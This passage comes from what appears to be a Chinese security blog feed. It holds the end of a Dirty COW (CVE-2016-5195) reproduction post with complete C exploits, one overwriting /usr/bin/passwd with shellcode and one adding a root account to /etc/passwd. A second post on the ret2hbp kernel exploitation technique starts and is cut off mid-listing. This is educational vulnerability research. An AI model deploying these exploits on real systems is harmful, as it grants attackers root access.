class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, attack_data, data_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <br>    dest_fd = open(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306190421.png" style="zoom: 80%;" /><p><strong>ç¢ç¢å¿µï¼š</strong></p><p>â€‹é¦–å…ˆæˆ‘è¯•å›¾ç”¨<code>strlen</code>å®Œæˆå¯¹<code>shellcode</code>çš„è®¡æ•°ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•éƒ½æ— æ³•æˆåŠŸï¼Œä¼°è®¡æ˜¯<code>strlen</code>ä¼šå¯¹å†…å­˜ä¸­çš„é¡µå¸ƒå±€æœ‰å½±å“ğŸ¤”ï¼ˆå¦‚æœæœ‰å¸¦å¸ˆå‚…äº†è§£æ˜¯ä»€ä¹ˆåŸå› è¯·åŠ¡å¿…è”ç³»ä¸€ä¸‹é“¸å¸ç¬”è€…ï¼Œä¸èƒœæ„Ÿæ¿€å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ï¼‰</p><p>â€‹å…¶æ¬¡æ˜¯éšä¾¿æ‹‰äº†ä¸€ä¸ª<code>kernel</code>é¢˜çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ›¿æ¢äº†ä¸‹å†…æ ¸ä¾¿å……å½“æ¼æ´å¤ç°ç¯å¢ƒäº†ï¼Œç»“æœå…·æœ‰<code>suid</code>çš„æ–‡ä»¶åªæœ‰<code>busybox</code>ä¸€ä¸ªï¼Œè¿™ç©æ„æ ¹æœ¬è¦†å†™ä¸äº†ä¸€ç‚¹ï¼Œå†™å®Œç›´æ¥<code>kernel panic</code>ã€‚ç„¶åæ”¾äº†ä¸€ä¸ªæ‰‹åŠ¨èµ‹äºˆ<code>suid</code>çš„<code>test</code>ç¨‹åºè¿›å»ï¼Œè¦†å†™å®Œæ‰§è¡Œä¼š<code>segment fault</code>ã€‚æ— å¥ˆåªèƒ½ä¸‹äº†ä¸€ä¸ª<code>ubuntu14.04</code>ã€‚</p><p>â€‹æœ€åä¾¿æ˜¯æå®Œæƒåï¼Œè¿‡ä¸€ä¼šä¼šï¼Œä¹Ÿä¼š<code>dump</code>æ‰ã€‚</p><h2 id="åˆ©ç”¨-etc-passwd-å®Œæˆææƒ"><a href="#åˆ©ç”¨-etc-passwd-å®Œæˆææƒ" class="headerlink" title="åˆ©ç”¨&#x2F;etc&#x2F;passwd&#x2F;å®Œæˆææƒ"></a>åˆ©ç”¨&#x2F;etc&#x2F;passwd&#x2F;å®Œæˆææƒ</h2><p>å¾€&#x2F;etc&#x2F;passwdæ–°æ·»ä¸€ä¸ªå…·æœ‰rootæƒé™çš„ç”¨æˆ·å³å¯</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><span class="hljs-type">int</span> info_len;<br><span class="hljs-type">char</span> * info_data;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * name;<br>    <span class="hljs-type">char</span> * password;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> gid;<br>    <span class="hljs-type">char</span> * info;<br>    <span class="hljs-type">char</span> * home_dir;<br>    <span class="hljs-type">char</span> * shell;<br>&#125;;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, info_data, info_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span> <span class="hljs-title">korey_info</span>;</span><br>    <br>    korey_info.name = <span class="hljs-string">&quot;korey&quot;</span>;<br>    korey_info.password = <span class="hljs-string">&quot;password&quot;</span>;<br>    korey_info.uid = <span class="hljs-number">0</span>;<br>    korey_info.gid = <span class="hljs-number">0</span>;<br>    korey_info.info = <span class="hljs-string">&quot;korey0sh1&#x27;s shell&quot;</span>;<br>    korey_info.home_dir = <span class="hljs-string">&quot;/root&quot;</span>;<br>    korey_info.shell = <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br><br>    info_len = <span class="hljs-built_in">snprintf</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    info_data = <span class="hljs-built_in">malloc</span>(info_len + <span class="hljs-number">10</span>);<br>    <br>    <span class="hljs-built_in">sprintf</span>(info_data, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;info is &quot;</span>);<br>    write(<span class="hljs-number">1</span>, info_data, info_len);<br><br><br>    dest_fd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>crypt.h</code>æ˜¯ä¸ªå¤–éƒ¨åº“ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ—¶å€™è¦æ‰‹åŠ¨åŠ ä¸ª<code>-lcrypt</code></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306201207.png"></p><p>è¿™ä¸ªå°±èˆ’æœå¤šäº†</p><h1 id="0xffï¼šå†™åœ¨æœ€å"><a href="#0xffï¼šå†™åœ¨æœ€å" class="headerlink" title="0xffï¼šå†™åœ¨æœ€å"></a>0xffï¼šå†™åœ¨æœ€å</h1><p>å‰åèŠ±äº†ä¸€å‘¨å·¦å³ï¼Œæ‰ç£•ç£•ç¢°ç¢°åœ°å¤ç°å®Œäº†è¿™ä¸ªå¤æ—©çš„<strong>CVE</strong></p><p>æœ¬æ¥æƒ³ç€è¿™ä¹ˆè€çš„æ´ï¼Œèƒ½ä¸èƒ½è¯•è¯•ä¸çœ‹åˆ«çš„å¸ˆå‚…çš„è§£æå’Œpocï¼Œè‡ªå·±ææ˜ç™½å¹¶æŠŠexpå†™å‡ºæ¥ğŸ˜­ğŸ˜­ğŸ˜­</p><p>ç»“æœå¤§å¤±è´¥å‘œå‘œå‘œğŸ¥µğŸ¥µğŸ¥µ</p><p>å›é¦–çœ‹8å¹´å‰çš„<strong>dirtycow</strong>ï¼Œç¬”è€…æ·±æ·±åœ°è¢«<code>Linux</code>å†…æ ¸åˆ©ç”¨ï¼Œè¿™é—¨<code>old school</code>çš„é»‘å®¢ç¾å­¦æŠ˜æœ</p><p>ç°åœ¨ç»ˆäºæ˜ç™½å°ä¸ƒå¸ˆå‚…è¯´çš„ï¼šå†…æ ¸åˆ©ç”¨çš„å‘å±•è·¯ç¨‹æœ¬èº«çš„é­…åŠ›å·²ç»è¶³å¤Ÿå¸å¼•äººï¼Œåœ¨æµ·è¾¹æ²™æ»©ä¸Šæ¡åˆ°ä¸€ä¸ªè´å£³å·²ç»è¶³å¤Ÿå¼€å¿ƒ: )</p><p>æœ›èƒ½ä¸æ–­åšæŒ: )</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/">ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a></p><p><a href="https://zhuanlan.zhihu.com/p/583209105">å‰–æè„ç‰›3_-proc-self-memæ˜¯æ€ä¹ˆå®ç°çš„ - çŸ¥ä¹ (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2hbp</title>
    <link href="/2024/01/29/ret2hbp/"/>
    <url>/2024/01/29/ret2hbp/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>ç»ˆäºç£•ç£•ç»Šç»Šåˆ°kerneläº†ï¼Œæ„Ÿæ…¨ä¸‡åƒå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><p>å¸Œæœ›èƒ½åœ¨è¿™classicçš„ç¾å­¦ä¸­æœ‰æ‰€æ”¶è·å§</p><p>èµ·åˆæ˜¯ğŸ‘´å•ƒäº†ä¸¤ä¸ªç¤¼æ‹œA3ğŸ‘´çš„åšå®¢ï¼Œæƒ³æ‰¾ç‚¹é¢˜ç»ƒç»ƒæ‰‹ï¼Œå°±å»åšäº†SCTF2023é‚£å‡ é“kernelé¢˜ï¼Œäºæ˜¯ä¾¿æœ‰äº†ret2hbpçš„å­¦ä¹ æ‰‹è®°</p><h1 id="0x01ï¼šwhat-is-ret2hbpï¼Ÿ"><a href="#0x01ï¼šwhat-is-ret2hbpï¼Ÿ" class="headerlink" title="0x01ï¼šwhat is ret2hbpï¼Ÿ"></a>0x01ï¼šwhat is ret2hbpï¼Ÿ</h1><p>é¦–å…ˆæˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªvery niceçš„ä»»æ„åœ°å€å†™ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªbuffğŸ˜€</p><ul><li>æ— é™æ¬¡æ•°</li><li>èƒ½é•¿æ—¶é—´å­˜åœ¨</li><li>é•¿åº¦ä»»æ„å¯æ§</li></ul><p>çœ‹èµ·æ¥ååˆ†ç™½ç»™ï¼Œbutè¿˜æ²¡æœ‰æ³„éœ²kalsrï¼Œæ‰€ä»¥ä¸€äº›å¸¸è§„çš„æ”»å‡»æ‰‹æ³•8æ˜¯å¾ˆè¡Œçš„é€šå‘œå‘œ</p><p>äºæ˜¯ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å¹²çš„äº‹æƒ…æ˜¯leakä¸€äº›å¥½åº·çš„ä¸œè¥¿å‡ºæ¥ã€‚</p><p>åœ¨<strong>Linux x86-64</strong>ä½“ç³»ç»“æ„ä¸‹ï¼Œå¤„ç†ç‰¹å®šä¸­æ–­å’Œå¼‚å¸¸çš„è¿‡ç¨‹ä¸­ï¼ŒCPUä¼šè·³è½¬åˆ°ç›¸åº”çš„æ ˆå¹¶è®°å½•å½“å‰çš„å¯„å­˜å™¨å†…å®¹ã€‚è¿™äº›æ ˆè¢«å®šä½åœ¨ä¸€ä¸ªå›ºå®šçš„ã€æœªè¿›è¡ŒéšæœºåŒ–çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œæ¯ç§ä¸­æ–­æˆ–å¼‚å¸¸éƒ½å¯¹åº”ä¸åŒçš„æ ˆã€‚è¿™äº›æ ˆä½äºä¸€ä¸ªåä¸º<code>struct cpu_entry_area</code>çš„ç»“æ„ä½“å­—æ®µå†…ã€‚</p><p>å…³äº<code>struct cpu_entry_area</code>çš„é™æ€å’ŒééšæœºåŒ–ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹Linuxå†…æ ¸çš„å®ç°æ¥äº†è§£å…¶å…·ä½“ä½ç½®ã€‚å…·ä½“æ¥è®²ï¼Œå†…æ ¸é€šè¿‡<code>get_cpu_entry_area()</code>å‡½æ•°æ¥è®¿é—®è¿™ä¸ªç»“æ„ä½“çš„ä½ç½®ã€‚è¿™ä¸ªå‡½æ•°è´Ÿè´£æä¾›å¯¹åº”çš„åœ°å€ï¼Œè®©ç³»ç»Ÿèƒ½å¤Ÿå®šä½åˆ°è¿™ä¸ªç‰¹å®šåŒºåŸŸã€‚</p><p>è¿™è¾¹é‡‡ç”¨çš„æ˜¯5.11.0ç‰ˆæœ¬çš„kernel</p><p>ä»¥ä¸‹åˆ†æå†…å®¹æ¥æºäºæ­¤<a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">ä¸€ç§å€ŸåŠ©ç¡¬ä»¶æ–­ç‚¹çš„ææƒæ€è·¯åˆ†æä¸æ¼”ç¤º (veritas501.github.io)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">noinstr <span class="hljs-keyword">struct</span> cpu_entry_area *<span class="hljs-title function_">get_cpu_entry_area</span><span class="hljs-params">(<span class="hljs-type">int</span> cpu)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> va = CPU_ENTRY_AREA_PER_CPU + cpu * CPU_ENTRY_AREA_SIZE;<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cpu_entry_area) % PAGE_SIZE != <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> cpu_entry_area *) va;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬”è€…å®åœ¨æ˜¯æ‡’ï¼Œå…·ä½“æ•°å€¼æ˜¯å¤šå°‘ğŸ‘´ä¹Ÿ8æƒ³ç®—äº†ï¼Œç›´æ¥gdbé‡Œçœ‹äº†</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240201212227.png" style="zoom:50%;" /><p>äºæ˜¯ä¹ï¼Œåœ¨5.11.0ä¸­ï¼Œ0xfffffe0000001000ä¾¿æ˜¯è¿™ä¸ªç»“æ„ä½“çš„å›ºå®šåœ°å€</p><p>å¤„ç†ä¸­æ–­æ—¶æ‰€ç”¨çš„æ ˆä½äº<code>struct cpu_entry_area</code>ç»“æ„ä½“å†…çš„<code>estacks</code>å­—æ®µä¸­ã€‚è¿™ä¸ªå­—æ®µåŒ…å«äº†ç”¨äºä¸­æ–­æ ˆè¡¨ï¼ˆ<code>Interrupt Stack Table</code>ï¼Œç®€ç§°ISTï¼‰çš„æ ˆï¼Œä¸ºä¸åŒç±»å‹çš„ä¸­æ–­å’Œå¼‚å¸¸æä¾›äº†ä¸“ç”¨çš„æ ˆç©ºé—´ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒLinuxç¡®ä¿åœ¨å¤„ç†ä¸­æ–­å’Œå¼‚å¸¸æ—¶ï¼Œèƒ½å¤Ÿå®‰å…¨åœ°åˆ‡æ¢æ ˆç©ºé—´ï¼ŒåŒæ—¶ä¿ç•™å½“å‰çš„å¯„å­˜å™¨çŠ¶æ€ï¼Œè¿™äº›æ ˆè¢«è®¾è®¡ä¸ºä½äºä¸€ä¸ªé¢„å®šçš„ã€ééšæœºåŒ–çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä»¥ä¾¿äºè®¿é—®å’Œç®¡ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Exception stacks used for IST entries with guard pages.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cea_exception_stacks</span> <span class="hljs-title">estacks</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>åœ¨<code>struct cea_exception_stacks</code>ä¸­é’ˆå¯¹æ¯ä¸€ç§ç±»å‹éƒ½æœ‰å¯¹åº”çš„æ ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ESTACKS_MEMBERS(guardsize, optional_stack_size)\</span><br><span class="hljs-meta">charDF_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDF_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charNMI_stack_guard[guardsize];\</span><br><span class="hljs-meta">charNMI_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charDB_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDB_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charMCE_stack_guard[guardsize];\</span><br><span class="hljs-meta">charMCE_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charVC_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC_stack[optional_stack_size];\</span><br><span class="hljs-meta">charVC2_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC2_stack[optional_stack_size];\</span><br><span class="hljs-meta">charIST_top_guard[guardsize];\</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">/* The exception stacks&#x27; physical storage. No guard pages required */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exception_stacks</span> &#123;</span><br>ESTACKS_MEMBERS(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™äº›æ ˆä¸»è¦ç”¨äºåœ¨ä»ç”¨æˆ·æ¨¡å¼åˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼çš„è¿‡ç¨‹ä¸­ï¼Œä»¥åŠåœ¨å†…æ ¸æ¨¡å¼ä¸‹å¤„ç†å¼‚å¸¸æƒ…å†µã€‚å®ƒä»¬é€šè¿‡<code>tss_setup_ist()</code>å‡½æ•°æ³¨å†Œåˆ°ç›¸åº”çš„ä¸­æ–­æ ˆè¡¨ï¼ˆISTï¼‰é¡¹ä¸­ï¼Œä»¥ç¡®ä¿åœ¨é‡åˆ°ç‰¹å®šçš„ä¸­æ–­æˆ–å¼‚å¸¸æ—¶ï¼Œç³»ç»Ÿèƒ½å¤Ÿæ­£ç¡®åœ°ä½¿ç”¨è¿™äº›é¢„è®¾çš„æ ˆè¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 